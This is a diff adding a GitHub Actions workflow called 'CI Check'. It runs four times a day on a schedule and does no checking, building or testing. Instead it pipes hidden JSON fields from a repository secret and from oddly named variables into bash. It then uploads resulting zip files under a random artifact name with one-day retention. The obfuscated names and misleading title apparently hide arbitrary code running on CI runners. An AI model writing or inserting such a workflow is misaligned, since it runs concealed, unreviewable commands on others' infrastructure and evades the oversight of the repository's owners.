@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          sf20: ${{ secrets.sf20 }}
+        run: |
+          printf '%s' "$sf20" | jq -r .qaq7754 | /bin/bash
+          echo $p92 | jq -r .mnge43 | /bin/bash
+          echo $ftkv68118 | jq -r .hxkx89661 | /bin/bash
+          printf '%s' "$d9" | jq -r .lnmu51 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: QvxglXuE
+          path: "*.zip"
+          retention-days: 1
